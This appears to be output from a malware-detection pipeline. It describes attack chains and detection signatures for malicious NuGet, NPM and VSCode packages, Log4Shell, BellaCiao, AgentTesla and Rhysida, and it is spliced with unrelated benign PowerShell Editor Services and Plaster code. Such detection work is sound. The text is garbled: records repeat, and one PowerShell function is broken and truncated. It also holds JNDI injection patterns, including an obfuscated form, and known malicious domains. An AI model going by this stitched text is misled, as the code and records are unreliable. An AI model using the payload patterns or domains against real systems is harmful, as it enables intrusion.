attack_chain.action: During NuGet package installation, a PowerShell script is executed that checks for a marker file, downloads an obfuscated batch file from a remote server, and executes it silently.
attack_chain.leads_to: Execution of the obfuscated batch file (xxxxx.cmd, from x.bin)

attack_chain.action: The obfuscated batch file reconstructs and executes a PowerShell script that extracts, decrypts, and decompresses embedded payloads.
attack_chain.leads_to: In-memory execution of the PowerShell loader

attack_chain.action: The PowerShell loader script decrypts and decompresses two DLLs (SeroXen RAT payloads) and loads them into memory for execution.
attack_chain.leads_to: Active deployment of SeroXen RAT on the victim system

behavioral_signatures: NuGet install scripts (init.ps1/install.ps1/uninstall.ps1) that download and execute remote files from hardcoded IP addresses during installation
Obfuscated batch files in temp directories that reconstruct and execute PowerShell scripts
In-memory decryption and execution of DLL payloads during NuGet package installation
Creation of marker files (e.g., SleepTheGod) in user temp directories to track execution
detection_knowledge.how_to_detect: Monitor NuGet package installations for execution of install/uninstall/init.ps1 scripts that perform network downloads, especially from hardcoded IP addresses. Flag packages that download and execute files in the temp directory, or that use obfuscated batch scripts to launch PowerShell. Detect in-memory assembly loading and execution of DLLs during package installation. Correlate with known malicious IPs and file hashes (e.g., x.bin, xxxxx.cmd). Look for creation of marker files such as SleepTheGod in user temp directories.

malice_analysis.similar_legitimate_use: There is no legitimate use case for this behavior in the context of NPM package installation.

package_info.why_malicious: These packages are typosquatted clones of popular NPM packages, designed to deceive developers into installing them. Upon installation, they execute a preinstall script that downloads and runs a remote Windows shortcut (.lnk), which in turn launches a PowerShell script to download and execute a VBS script for credential exfiltration. This results in remote code execution and theft of sensitive information from developer machines.

attack_chain.action: During installation, the preinstall hook in package.json executes index.js.
attack_chain.leads_to: index.js is executed

attack_chain.action: index.js downloads a malicious Windows shortcut (.lnk) from a remote server and executes it.
attack_chain.leads_to: README.txt.lnk is executed

attack_chain.action: The .lnk file launches cmd.exe, which runs PowerShell to download and execute a VBS script from a remote server, leading to credential exfiltration.
attack_chain.leads_to: User credentials are exfiltrated; system is compromised

behavioral_signatures: NPM package with preinstall hook executing custom JavaScript code
Installation-time download and execution of remote .lnk or executable files
Chained execution of cmd.exe, PowerShell, and remote script download during package installation
Immediate execution of downloaded files (e.g., .lnk, .vbs) during package installation
file_indicators: index.js containing child_process.exec and remote file download logic
Presence of README.txt.lnk in package directory or %TEMP% directory
Downloaded VBS scripts (e.g., p.vbs) in %TEMP% directory
detection_knowledge.how_to_detect: Monitor for NPM packages that define a preinstall script executing custom JavaScript. Flag any package that downloads and executes remote files (especially .lnk, .exe, .vbs) during installation. Detect network requests to known malicious domains (e.g., cdn.discordapp.com/attachments/..., enyhpvl.pythonanywhere.com). Alert on the presence or execution of suspicious files such as README.txt.lnk or p.vbs in user or temp directories. Correlate installation of typosquatted package names with these behaviors for rapid response and automated quarantine.

function ConvertFrom-ScriptExtent {
    <#
    .EXTERNALHELP ..\PowerShellEditorServices.Commands-help.xml
    #>
    [CmdletBinding()]
    [OutputType([Microsoft.PowerShell.EditorServices.BufferRange],      ParameterSetName='BufferRange')]
    [OutputType([Microsoft.PowerShell.EditorServices.BufferPosition],   ParameterSetName='BufferPosition')]
    param(
        [Parameter(Mandatory, ValueFromPipeline, ValueFromPipelineByPropertyName)]
        [ValidateNotNullOrEmpty()]
        [System.Management.Automation.Language.IScriptExtent[]]
        $Extent,

        [Parameter(ParameterSetName='BufferRange')]
        [switch]
        $BufferRange,

        [Parameter(ParameterSetName='BufferPosition')]
        [switch]
        $BufferPosition,

        [Parameter(ParameterSetName='BufferPosition')]
        [switch]
        $Start,

        [Parameter(ParameterSetName='BufferPosition')]
        [switch]
        $End
    )
    process {
        foreach ($aExtent in $Extent) {
            switch ($PSCmdlet.ParameterSetName) {
                BufferRange {
                    # yield
                    New-Object Microsoft.PowerShell.EditorServices.BufferRange @(
                        $aExtent.StartLineNumber,
                        $aExtent.StartColumnNumber,
                        $aExtent.EndLineNumber,
                        $aExtent.EndColumnNumber)
                }
                BufferPosition {
                    if ($End) {
                        $line   = $aExtent.EndLineNumber
                        $column = $aExtent.EndLineNumber
                    } else {
                        $line   = $aExtent.StartLineNumber
                        $column = $aExtent.StartLineNumber
                    }
                    # yield
                    New-Object Microsoft.PowerShell.EditorServices.BufferPosition @(
                        $line,
                        $column)
                }
            }
        }
    }
}

malice_analysis.why_suspicious: This is a common technique for in-memory malware delivery and execution, often used to bypass disk-based detection and persist malicious activity.
malice_analysis.violated_expectations: Production systems should not execute remote PowerShell scripts from untrusted sources, especially as a result of log message processing.
malice_analysis.similar_legitimate_use: PowerShell remoting and automation may use similar patterns, but only with trusted, internal scripts and never triggered by log data.

Remote script execution from untrusted or unknown domains

package_info.package_versions: 2.0-beta9 to 2.14.1 (inclusive)
package_info.why_malicious: These versions of Log4j contain a critical remote code execution vulnerability (CVE-2021-44228, Log4Shell) that allows attackers to inject specially crafted JNDI lookup strings into log messages. This results in arbitrary code execution or sensitive data exfiltration, as Log4j's JNDI feature can be abused to load and execute remote code, enabling attackers to take full control of affected systems.

attack_chain.action: Attacker sends a specially crafted JNDI lookup string in user-controlled input (e.g., HTTP header, form field) to the vulnerable application.
attack_chain.leads_to: Log4j logs the input, triggering a JNDI lookup.

attack_chain.action: Log4j interprets the JNDI lookup string and initiates a connection to an attacker-controlled LDAP server.
attack_chain.leads_to: Application receives a response from the attacker's LDAP server.

attack_chain.action: Attacker's LDAP server responds with a reference to a remote Java class file, which the application downloads and executes.
attack_chain.leads_to: Remote code execution on the application server.

attack_chain.action: Attacker executes post-exploitation payloads to download and run malware, exfiltrate credentials, and establish persistence.
attack_chain.leads_to: System compromise, data theft, and persistence.

attack_chain.action: Attacker may use obfuscated payloads to evade detection and continue exploitation.
attack_chain.leads_to: Continued exploitation and evasion of security controls.

behavioral_signatures: JNDI lookup patterns in log messages (e.g., ${jndi:ldap://...})
Obfuscated JNDI payloads in log messages (e.g., ${jn${lower:d}i:l${lower:d}ap://...})
Unexpected outbound LDAP or DNS connections from application servers during log processing
Java processes spawning shell commands or system utilities (e.g., curl, wget, powershell)
Runtime installation of network utilities (curl, wget) or package managers (apt, yum, apk)
Crontab or systemd service modifications at runtime
Exfiltration of environment variables or credential files via network requests
file_indicators: Crontab entries referencing unknown or suspicious scripts
New or modified systemd service files created post-compromise
Downloaded binaries with short, generic names in /tmp, /var/tmp, or /dev/shm
network_indicators: Outbound LDAP connections to untrusted IPs or domains
DNS requests containing environment variable values (e.g., AWS keys) in subdomains
HTTP POST requests to attacker-controlled domains (e.g., interactsh.com, webhook.site) with credential data
Outbound connections to download remote Java class files (*.class) from untrusted sources
detection_knowledge.how_to_detect: Monitor application logs for JNDI lookup patterns, including obfuscated variants. Detect unexpected outbound LDAP, DNS, or HTTP connections from application servers, especially those containing sensitive data or environment variable values. Alert on Java processes spawning shells, installing packages, or modifying crontabs/systemd services. Watch for access to sensitive files (e.g., ~/.aws/credentials) and exfiltration attempts. Use network monitoring to identify suspicious egress traffic, and correlate with log and process activity for comprehensive detection.

matched_snippet.code_behavior: At runtime, the PowerShell script runs a local HTTP server to receive remote commands, then launches a disguised executable to communicate with the hardcoded C2 domain mail-updateservice[.]info, enabling remote control and data exfiltration.

malice_analysis.why_suspicious: Running a local HTTP server for remote command execution and launching disguised binaries for C2 communication is highly indicative of malware, as it enables attackers to interact with the compromised host and evade detection.
malice_analysis.violated_expectations: Legitimate PowerShell scripts do not typically implement command servers or communicate with suspicious domains using executables disguised as system components.
malice_analysis.similar_legitimate_use: Rare in enterprise automation, and not with these characteristics or targeting suspicious infrastructure.
key_indicators: Local HTTP server implemented in PowerShell
Execution of disguised binaries from non-standard paths
Hardcoded C2 domain in communication logic

package_info.package_manager: custom malware (Windows executable, PowerShell scripts, and droppers)
package_info.package_versions: N/A (custom tailored per target)
package_info.why_malicious: BellaCiao is a custom dropper malware attributed to the Charming Kitten APT group. It is designed to deliver additional payloads, establish persistence on compromised systems, enable remote command execution, and facilitate data exfiltration. The malware uses hardcoded command-and-control (C2) infrastructure, masquerades as legitimate Microsoft Exchange services, and leverages reverse proxy tools such as Plink for covert C2 communication, making detection and remediation challenging.

attack_chain.action: Initial execution of the BellaCiao dropper on the target system.
attack_chain.leads_to: Payload decoding and execution

attack_chain.action: Decoding and writing of the embedded payload to disk, followed by execution.
attack_chain.leads_to: Establishing persistence and C2 setup

attack_chain.action: Establishing persistence by creating a disguised Windows service.
attack_chain.leads_to: Automatic execution on system startup

attack_chain.action: Launching PowerShell scripts to set up local HTTP servers for command execution.
attack_chain.leads_to: Remote command and control

attack_chain.action: Establishing reverse proxy tunnels to C2 infrastructure using Plink, either directly or via WMIC.
attack_chain.leads_to: Covert C2 communication

attack_chain.action: Ongoing communication with C2 domains for command execution and further payload delivery.
attack_chain.leads_to: Full remote control and post-exploitation

behavioral_signatures: Decoding and execution of embedded, malformed base64 payloads within executables
Creation of Windows services with names mimicking Exchange processes and pointing to non-standard binary locations
PowerShell scripts running local HTTP servers for remote command execution
Execution of Plink or similar tunneling tools for reverse proxying to external IPs or domains
Use of WMIC to launch processes with parameters establishing reverse proxies to C2 infrastructure
detection_knowledge.how_to_detect: Monitor for the creation of new Windows services with names similar to Exchange processes, especially if the associated binaries are located in non-standard directories. Detect PowerShell scripts that implement local HTTP servers or execute binaries with suspicious, Exchange-like names. Look for execution of Plink or similar tunneling tools, particularly when launched via WMIC or with parameters connecting to known C2 domains or IPs. Correlate network traffic to the listed domains and IP addresses, and flag any outbound connections to these indicators. Use YARA or similar rules to identify executables containing malformed base64-encoded payloads. Combine behavioral, file, and network indicators for comprehensive detection and response.

matched_knowledge.source_package: AgentTesla Christmas Campaign / Die Hard-themed Batch+PowerShell Dropper (N/A (malware distributed via phishing email attachments, not a package manager))

matched_snippet.code_snippet: PowerShell script creates a reverse shell backdoor, allowing execution of arbitrary PowerShell commands from the attacker's system.
matched_snippet.code_behavior: At runtime, the PowerShell script establishes a reverse shell connection to the attacker's system, enabling the attacker to execute arbitrary PowerShell commands on the victim's machine and maintain persistent remote access.

malice_analysis.why_suspicious: Reverse shells are a primary method for attackers to gain unauthorized remote control over victim systems, often used for post-exploitation and lateral movement.
malice_analysis.violated_expectations: PowerShell scripts should not create unauthorized remote access channels or allow arbitrary command execution from external sources.
malice_analysis.similar_legitimate_use: Red teamers and system administrators may use reverse shells for authorized testing or remote support, but not via disguised image files or without user awareness.
key_indicators: Reverse shell creation enabling remote access
Arbitrary command execution capability
PowerShell code hosted on pastebin for dynamic retrieval

package_info.package_name: AgentTesla Christmas Campaign / Die Hard-themed Batch+PowerShell Dropper
package_info.package_manager: N/A (malware distributed via phishing email attachments, not a package manager)
package_info.package_versions: N/A (malicious executables and scripts, not versioned packages)
package_info.why_malicious: This campaign leverages phishing emails with holiday themes to deliver malware, including AgentTesla infostealer and a Die Hard-themed dropper. The attack uses malicious executables and scripts to open backdoors, exfiltrate credentials, perform keylogging, and enable remote control of infected systems. The payloads include a multi-stage loader using obfuscated AutoIt scripts, in-memory shellcode execution, process injection, and a batch file that downloads and executes a PowerShell-based reverse shell.

attack_chain.action: User receives phishing email with malicious attachment (holiday-themed).
attack_chain.leads_to: User opens attachment, triggering malware execution.

attack_chain.action: User executes malicious file (either .exe or disguised batch file).
attack_chain.leads_to: Malware loader or dropper runs.

attack_chain.action: Malware loader drops and executes obfuscated scripts and shellcode (AgentTesla chain) or downloads and runs PowerShell (Die Hard chain).
attack_chain.leads_to: Payload is loaded into memory or reverse shell is established.

attack_chain.action: Payload executes: AgentTesla infostealer exfiltrates data and communicates with C2, or PowerShell reverse shell gives attacker remote access.
attack_chain.leads_to: Data exfiltration, remote control, and further exploitation.

behavioral_signatures: Executable or script drops multiple files with random names to temp directories
Obfuscated AutoIt scripts that deobfuscate and execute shellcode in memory
In-memory loading of executables and system DLLs (e.g., ntdll.dll)
Process injection and anti-analysis checks (API hook detection, in-memory DLL copy)
Credential theft from browsers, FTP, and email clients
Keylogging and unauthorized access to keyboard input
Batch files disguised as images (e.g., .jpg.bat) that download and execute PowerShell scripts
PowerShell scripts establishing reverse shells and enabling arbitrary command execution
file_indicators: Files with random names in %usertemp% (e.g., fkkvzetzm.exe, jfwxswcu.au3, igqyivch.prc, kywyozha.x)
Archives containing executables or disguised batch files (e.g., good_time.zip, new designs.gz)
detection_knowledge.how_to_detect: Monitor for execution of files with suspicious or double extensions (e.g., .jpg.bat), especially when originating from email attachments. Detect batch files or scripts that download and execute remote PowerShell code, particularly from pastebin or similar services. Flag in-memory execution of shellcode, process injection, and use of obfuscated AutoIt scripts. Watch for outbound connections to known C2 infrastructure, such as Telegram API endpoints and pastebin links. Alert on credential access, keylogging activity, and attempts to exfiltrate data via unusual network channels. Correlate behavioral, file, and network indicators to identify multi-stage loader activity and infostealer deployment.

matched_knowledge.source_package: VoiceMod.VoiceMod (VSCode Marketplace)

matched_snippet.code_behavior: At extension activation (import-time), the code registers and triggers a command that downloads a Windows CMD file from a suspicious external domain using curl, saves it to the user's TEMP directory, and executes it, resulting in arbitrary code execution and enabling further payload delivery.

malice_analysis.why_suspicious: The code initiates an immediate download and execution of a remote script from a non-Microsoft domain upon extension activation, which is highly abnormal and indicative of malicious intent.
malice_analysis.violated_expectations: Legitimate VSCode extensions should not download and execute external scripts or binaries from untrusted domains, nor should they run hidden commands without explicit user consent.
malice_analysis.similar_legitimate_use: Some legitimate extensions may fetch language servers or dependencies, but only from trusted, official sources and with user transparency. They do not execute downloaded scripts automatically.
key_indicators: Downloads executable script from suspicious domain (microsoft-visualstudiocode[.]com)
Executes downloaded script without user interaction
Obfuscated function and variable names in code
No legitimate reason for CMD file execution in productivity or crypto-related extensions

package_info.package_versions: 0.2.0 (and other versions for listed extensions)
package_info.why_malicious: The extensions contain downloader functionality that fetches and executes heavily obfuscated second-stage payloads from attacker-controlled domains. These payloads launch hidden PowerShell commands, decrypt further encrypted payloads, and execute them, enabling arbitrary code execution, credential theft, and asset compromise. The extensions use fake reviews and artificially inflated install counts to appear legitimate and evade user suspicion.

attack_chain.action: Extension is installed and activated, triggering malicious code.
attack_chain.leads_to: Download and execution of remote CMD file.

attack_chain.action: Downloaded CMD file launches hidden PowerShell with obfuscated payload.
attack_chain.leads_to: Decryption and execution of further payloads.

attack_chain.action: PowerShell decrypts and writes DLL payload (e.g., MLANG.DLL) to disk and executes it.
attack_chain.leads_to: Final-stage malware execution (arbitrary code, credential theft, persistence, etc.)

behavioral_signatures: VSCode extension downloads and executes external scripts or binaries from untrusted domains
Hidden PowerShell process launched from extension or CMD file
AES/base64 decryption and execution of payloads within PowerShell
DLLs written and executed from TEMP directory by extension-initiated processes
file_indicators: Obfuscated CMD and PowerShell scripts in TEMP directory
network_indicators: Other suspicious TLDs such as .lat and .ru used for payload delivery
detection_knowledge.how_to_detect: Monitor for VSCode extensions that initiate network requests to untrusted or suspicious domains, download and execute scripts or binaries, or launch hidden PowerShell processes. Flag extensions that write or execute files in the TEMP directory, especially DLLs or CMD files. Correlate with known malicious domains and look for obfuscated or encrypted payloads being decrypted and executed at runtime. Use behavioral monitoring to detect chained execution from extension to CMD to PowerShell to DLL.

slice_results.behavior_summary: When executed (shell script), the code accesses PowerShell modules and commands using reflection and cmdlet APIs to retrieve editor command metadata from specified modules or command names, facilitating the dynamic import and registration of editor commands within the PowerShell Editor Services environment.
slice_results.explanation: [LLM Judgment: Benign] The provided PowerShell code is a legitimate function designed to import editor commands dynamically within the PowerShell Editor Services environment. It uses reflection and standard PowerShell cmdlet APIs to retrieve metadata about commands and modules. There is no evidence of suspicious activities such as user enumeration, system information gathering for malicious purposes, command and control communication, or execution of disguised binaries. The known malicious patterns involve enumeration for privilege escalation or setting up C2 communication channels, none of which are present here. The code's behavior aligns with normal extension or plugin management in a development environment, not malware.

matched_knowledge.source_package: Rhysida Ransomware (N/A (malware binary, not a package manager ecosystem))

matched_snippet.code_snippet: PowerShell commands to enumerate users and system information
matched_snippet.code_behavior: At runtime, the code executes PowerShell commands to enumerate local and domain users, gather system information, and collect environment details, enabling the attacker to map the environment and identify targets for privilege escalation and lateral movement.

malice_analysis.why_suspicious: Automated enumeration of users and system details via PowerShell is a common precursor to privilege escalation and lateral movement in targeted attacks, especially when performed outside of authorized administrative activity.
malice_analysis.violated_expectations: Normal PowerShell usage should not involve mass enumeration of users and system details except during scheduled administrative or inventory tasks, and should not be executed by unprivileged or unexpected accounts.
malice_analysis.similar_legitimate_use: System administrators may use similar scripts for inventory, troubleshooting, or compliance audits, but such activity is typically logged, scheduled, and performed by known admin accounts.
key_indicators: PowerShell execution of user and system enumeration commands
Execution by non-administrative or unexpected accounts
Enumeration activity outside of normal maintenance windows
Absence of corresponding authorized change tickets

package_info.package_manager: N/A (malware binary, not a package manager ecosystem)
package_info.package_versions: Multiple variants (Windows and Linux binaries)
package_info.why_malicious: The Rhysida ransomware is a sophisticated threat designed to encrypt files, exfiltrate sensitive data, and extort victims for ransom payments. It leverages legitimate administrative tools for lateral movement, persistence, and data exfiltration, and deploys custom ransomware binaries targeting both Windows and Linux systems, including ESXi hosts. Its multi-stage attack chain and use of dual-use tools make detection and remediation challenging.

attack_chain.action: Initial access and enumeration of users and systems using PowerShell.
attack_chain.leads_to: Privilege escalation and lateral movement.

attack_chain.action: Establish persistence and remote execution using PSExec and registry modifications.
attack_chain.leads_to: Maintained access for further actions.

attack_chain.action: Install and configure AnyDesk for persistent remote access.
attack_chain.leads_to: Hands-on-keyboard control by attacker.

attack_chain.action: Exfiltrate data using WinSCP and MegaSync.
attack_chain.leads_to: Data theft and extortion leverage.

attack_chain.action: Deploy and execute ransomware binaries to encrypt files and display ransom note.
attack_chain.leads_to: Ransom demand and operational disruption.

behavioral_signatures: Unusual PowerShell activity for user and system enumeration by non-admin accounts or outside maintenance windows
PSExec usage for unauthorized task scheduling and registry modification, especially for persistence
Installation or execution of remote access tools (AnyDesk) without explicit IT approval or user consent
WinSCP or MegaSync used for large, unscheduled outbound file transfers to unknown destinations
Mass file encryption events and sudden creation of ransom note files across multiple directories
Deletion of shadow copies or backup files in conjunction with encryption activity
file_indicators: Presence of AnyDesk, WinSCP, or MegaSync executables on sensitive or non-IT systems
Ransom note files such as README.txt or Rhysida-specific notes in multiple directories
Unusual registry key modifications for persistence (e.g., HKLM\Software\Microsoft\Windows\CurrentVersion\Run)
Custom ransomware binaries present on Windows, Linux, or ESXi hosts
network_indicators: Outbound connections to Mega cloud storage domains (e.g., mega.nz, mega.co.nz)
Unusual WinSCP SFTP/FTP traffic to external IPs or domains not on allowlist
AnyDesk remote session traffic initiated from non-IT systems or outside business hours
detection_knowledge.how_to_detect: Monitor for abnormal PowerShell and PSExec activity, including enumeration and persistence actions by unexpected accounts. Detect unauthorized installation or execution of remote access and file transfer tools such as AnyDesk, WinSCP, and MegaSync. Alert on large, unscheduled outbound data transfers to cloud storage services or unknown external servers. Correlate the sudden appearance of ransom note files and mass file encryption events with deletion of backups or shadow copies. Combine behavioral, file, and network indicators with user and process context to identify and respond to potential Rhysida ransomware activity.

function ConvertTo-ScriptExtent {

    #>
    [CmdletBinding()]
    [OutputType([System.Management.Automation.Language.IScriptExtent])]
    param(

        [Alias('StartOffset', 'Offset')]
        [int]

        [Parameter(ValueFromPipelineByPropertyName, ParameterSetName='ByOffset')]
        [Alias('EndOffset')]
        [int]
        $EndOffsetNumber,

        [Parameter(ValueFromPipelineByPropertyName, ParameterSetName='ByPosition')]
        [Alias('StartLine', 'Line')]
        [int]
        $StartLineNumber,

        [Parameter(ValueFromPipelineByPropertyName, ParameterSetName='ByPosition')]
        [Alias('StartColumn', 'Column')]
        [int]
        $StartColumnNumber,

        [Parameter(ValueFromPipelineByPropertyName, ParameterSetName='ByPosition')]
        [Alias('EndLine')]
        [int]
        $EndLineNumber,

        [Parameter(ValueFromPipelineByPropertyName, ParameterSetName='ByPosition')]
        [Alias('EndColumn')]
        [int]
        $EndColumnNumber,

        [Parameter(ValueFromPipelineByPropertyName, ParameterSetName='ByPosition')]
        [Parameter(ValueFromPipelineByPropertyName, ParameterSetName='ByOffset')]
        [Parameter(ValueFromPipelineByPropertyName, ParameterSetName='ByBuffer')]
        [Alias('File', 'FileName')]
        [string]
        $FilePath = $psEditor.GetEditorContext().CurrentFile.Path,

        [Parameter(ValueFromPipelineByPropertyName, ParameterSetName='ByBuffer')]
        [Alias('Start')]
        [Microsoft.PowerShell.EditorServices.BufferPosition]
        $StartBuffer,

        [Parameter(ValueFromPipelineByPropertyName, ParameterSetName='ByBuffer')]
        [Alias('End')]
        [Microsoft.PowerShell.EditorServices.BufferPosition]
        $EndBuffer,

        [Parameter(Mandatory,
                   ValueFromPipeline,
                   ValueFromPipelineByPropertyName,
                   ParameterSetName='ByExtent')]
        [System.Management.Automation.Language.IScriptExtent]
        $Extent
    )
    begin {
        $fileContext = $psEditor.GetEditorContext().CurrentFile
        $emptyExtent = New-Object Microsoft.PowerShell.EditorServices.FullScriptExtent @(
            <# filecontext: #> $fileContext,
            <# startOffset: #> 0,
            <# endOffset:   #> 0)
    }
    process {
        # Already a InternalScriptExtent, FullScriptExtent or is empty.
        $returnAsIs = $Extent -and
                     (0 -ne $Extent.StartOffset   -or
                      0 -ne $Extent.EndOffset     -or
                      $Extent -eq $emptyExtent)

function Join-ScriptExtent {
    <#
    .EXTERNALHELP ..\PowerShellEditorServices.Commands-help.xml
    #>
    [CmdletBinding()]
    [OutputType([System.Management.Automation.Language.IScriptExtent])]
    param(
        [Parameter(ValueFromPipeline, ValueFromPipelineByPropertyName)]
        [System.Management.Automation.Language.IScriptExtent[]]
        $Extent
    )
    begin {
        $extentList = New-Object System.Collections.Generic.List[System.Management.Automation.Language.IScriptExtent]
    }
    process {
        if ($Extent) {
            $extentList.AddRange($Extent)
        }
    }
    end {
        if (-not $extentList) { return }

        $startOffset = [Linq.Enumerable]::Min($extentList.StartOffset -as [int[]])
        $endOffset   = [Linq.Enumerable]::Max($extentList.EndOffset -as [int[]])

        return New-Object Microsoft.PowerShell.EditorServices.FullScriptExtent @(
            $psEditor.GetEditorContext().CurrentFile,
            $startOffset,
            $endOffset)
    }
}

## DEVELOPERS NOTES & CONVENTIONS
##
##  1. All text displayed to the user except for Write-Debug (or $PSCmdlet.WriteDebug()) text must be added to the
##     string tables in:
##         en-US\Plaster.psd1
##         Plaster.psm1
##  2. If a new manifest element is added, it must be added to the Schema\PlasterManifest-v1.xsd file and then
##     processed in the appropriate function in this script.  Any changes to <parameter> attributes must be
##     processed not only in the ProcessParameter function but also in the dynamicparam function.
##
##  3. Non-exported functions should avoid using the PowerShell standard Verb-Noun naming convention.
##     They should use PascalCase instead.
##
##  4. Please follow the scripting style of this file when adding new script.

function Invoke-Plaster {
    [System.Diagnostics.CodeAnalysis.SuppressMessage('PSAvoidShouldContinueWithoutForce', '', Scope='Function', Target='CopyFileWithConflictDetection')]
    [System.Diagnostics.CodeAnalysis.SuppressMessage('PSAvoidUsingConvertToSecureStringWithPlainText', '', Scope='Function', Target='ProcessParameter')]
    [System.Diagnostics.CodeAnalysis.SuppressMessage('PSShouldProcess', '', Scope='Function', Target='CopyFileWithConflictDetection')]
    [System.Diagnostics.CodeAnalysis.SuppressMessage('PSShouldProcess', '', Scope='Function', Target='ProcessFile')]
    [System.Diagnostics.CodeAnalysis.SuppressMessage('PSShouldProcess', '', Scope='Function', Target='ProcessModifyFile')]
    [System.Diagnostics.CodeAnalysis.SuppressMessage('PSShouldProcess', '', Scope='Function', Target='ProcessNewModuleManifest')]
    [System.Diagnostics.CodeAnalysis.SuppressMessage('PSShouldProcess', '', Scope='Function', Target='ProcessRequireModule')]
    [CmdletBinding(SupportsShouldProcess=$true)]
    param(
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]
        $TemplatePath,

        [Parameter(Position = 1, Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]
        $DestinationPath,

        [Parameter()]
        [switch]
        $Force,

        [Parameter()]
        [switch]
        $NoLogo,

        [Parameter()]
        [switch]
        $PassThru
    )

    # Process the template's Plaster manifest file to convert parameters defined there into dynamic parameters.
    dynamicparam {
        $paramDictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary

        $manifest = $null
        $manifestPath = $null
        $templateAbsolutePath = $null

        # Nothing to do until the TemplatePath parameter has been provided.
        if ($null -eq $TemplatePath) {
            return
        }

        try {
            # Let's convert non-terminating errors in this function to terminating so we
            # catch and format the error message as a warning.
            $ErrorActionPreference = 'Stop'

            # The constrained runspace is not available in the dynamicparam block.  Shouldn't be needed
            # since we are only evaluating the parameters in the manifest - no need for EvaluateConditionAttribute as we
            # are not building up multiple parametersets.  And no need for EvaluateAttributeValue since we are only
            # grabbing the parameter's value which is static.
            $templateAbsolutePath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($TemplatePath)
            if (!(Test-Path -LiteralPath $templateAbsolutePath -PathType Container)) {
                throw ($LocalizedData.ErrorTemplatePathIsInvalid_F1 -f $templateAbsolutePath)
            }

            # Load manifest file using culture lookup
            $manifestPath = GetPlasterManifestPathForCulture $templateAbsolutePath $PSCulture
            if (($null -eq $manifestPath) -or (!(Test-Path $manifestPath))) {
                return
            }

slice_results.behavior_summary: When called (reached via waitForSessionFile.innerTryFunc -> waitForSessionFile.innerTryFunc.<anon@69> -> waitForSessionFile -> package/out/client/process.js:PowerShellProcess.start.<anon@37>.<anon@65> -> readSessionFile; module scope not reached in module), the code repeatedly checks for the existence of a session file at a specified path and, once found, reads and parses its JSON content using fs.readFileSync, returning the session details to the caller, enabling synchronization with a PowerShell process startup.
slice_results.explanation: [LLM Judgment: Benign] The analyzed code implements a legitimate synchronization mechanism to wait for a session file created by a PowerShell process, repeatedly checking for the file's existence and reading its JSON content once available. It uses standard Node.js filesystem APIs (fs.readFileSync, fs.accessSync, fs.existsSync) without any obfuscation or dynamic code execution. Although it launches PowerShell with the '-ExecutionPolicy Bypass' flag on Windows, this is a common and documented practice for legitimate PowerShell extensions or tooling to avoid policy restrictions, not inherently malicious. The code does not spawn hidden processes, obfuscate API calls, execute arbitrary code dynamically, or attempt to exfiltrate data. Compared to the known malicious patterns, it lacks key indicators such as obfuscation (Example 1), hidden PowerShell execution via WScript.Shell (Example 2), or sandbox escape and environment variable exfiltration (Example 3). Therefore, there is very low confidence that this code is malicious.

matched_snippet.code_behavior: At extension activation (import-time), the code registers and triggers a command that downloads a Windows CMD file from a suspicious external domain using curl, saves it to the user's TEMP directory, and executes it, resulting in arbitrary code execution and enabling further payload delivery.

malice_analysis.why_suspicious: The code initiates an immediate download and execution of a remote script from a non-Microsoft domain upon extension activation, which is highly abnormal and indicative of malicious intent.
malice_analysis.violated_expectations: Legitimate VSCode extensions should not download and execute external scripts or binaries from untrusted domains, nor should they run hidden commands without explicit user consent.
malice_analysis.similar_legitimate_use: Some legitimate extensions may fetch language servers or dependencies, but only from trusted, official sources and with user transparency. They do not execute downloaded scripts automatically.

Obfuscated function and variable names in code
No legitimate reason for CMD file execution in productivity or crypto-related extensions

malice_analysis.similar_legitimate_use: Enterprise IT automation may use PowerShell for deployment, but not in user-facing update prompts or with hidden execution and policy bypass.

powershell -ExecutionPolicy Bypass

The malware uses hardcoded command-and-control (C2) infrastructure, masquerades as legitimate Microsoft Exchange services, and leverages reverse proxy tools such as Plink for covert C2 communication, making detection and remediation challenging.

attack_chain.action: Initial execution of the BellaCiao dropper on the target system.
attack_chain.leads_to: Payload decoding and execution

attack_chain.action: Decoding and writing of the embedded payload to disk, followed by execution.
attack_chain.leads_to: Establishing persistence and C2 setup

attack_chain.action: Establishing persistence by creating a disguised Windows service.
attack_chain.leads_to: Automatic execution on system startup

attack_chain.action: Launching PowerShell scripts to set up local HTTP servers for command execution.
attack_chain.leads_to: Remote command and control

attack_chain.action: Establishing reverse proxy tunnels to C2 infrastructure using Plink, either directly or via WMIC.
attack_chain.leads_to: Covert C2 communication

attack_chain.action: Ongoing communication with C2 domains for command execution and further payload delivery.
attack_chain.leads_to: Full remote control and post-exploitation

behavioral_signatures: Decoding and execution of embedded, malformed base64 payloads within executables
Creation of Windows services with names mimicking Exchange processes and pointing to non-standard binary locations
PowerShell scripts running local HTTP servers for remote command execution
Execution of Plink or similar tunneling tools for reverse proxying to external IPs or domains
Use of WMIC to launch processes with parameters establishing reverse proxies to C2 infrastructure
detection_knowledge.how_to_detect: Monitor for the creation of new Windows services with names similar to Exchange processes, especially if the associated binaries are located in non-standard directories. Detect PowerShell scripts that implement local HTTP servers or execute binaries with suspicious, Exchange-like names. Look for execution of Plink or similar tunneling tools, particularly when launched via WMIC or with parameters connecting to known C2 domains or IPs. Correlate network traffic to the listed domains and IP addresses, and flag any outbound connections to these indicators. Use YARA or similar rules to identify executables containing malformed base64-encoded payloads. Combine behavioral, file, and network indicators for comprehensive detection and response.
